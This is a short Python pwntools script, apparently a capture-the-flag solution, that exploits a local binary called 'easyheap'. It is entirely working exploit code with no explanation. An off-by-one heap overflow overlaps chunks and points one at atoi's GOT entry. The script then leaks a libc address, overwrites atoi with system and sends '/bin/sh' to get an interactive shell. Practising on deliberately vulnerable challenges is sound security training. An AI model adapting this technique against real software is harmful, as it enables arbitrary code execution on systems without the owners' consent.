from pwn import *

s = process('./easyheap')
context(log_level='debug', arch='amd64', os='linux')

def choide(i):
    s.sendafter(':', str(i))


def add(size, content=''):
    choide(1)
    s.sendafter(':', str(size))
    if content:
        s.sendafter(':', content)


def free(i):
    choide(4)
    s.sendafter(':', str(i))


def edit(i, content):
    choide(2)
    s.sendafter(':', str(i))
    s.sendafter(':', content)


def show(i):
    choide(3)
    s.sendafter(':', str(i))


elf = ELF('./easyheap')
atoi_got_addr = elf.got['atoi']
assert 0x602058 == atoi_got_addr

add(24, 'AAAA')  # 0
add(24, 'BBBB')  # 1
add(24, 'CCCC')  # 2
add(24, 'DDDD')  # 3

edit(0, b'A' * 0x18 + b'\x41')
free(1)

add(56, b'j' * 8 * 4 + p64(0x41) + p64(atoi_got_addr))
# gdb.attach(s)
show(1)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
leak = u64(s.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.success('leak:' + hex(leak))
libc.address = leak - libc.sym['atoi']
system = libc.sym['system']
log.success('system:' + hex(system))
edit(1, p64(system))

s.recvuntil("Your choice :")
s.sendline("/bin/sh\x00")

s.interactive()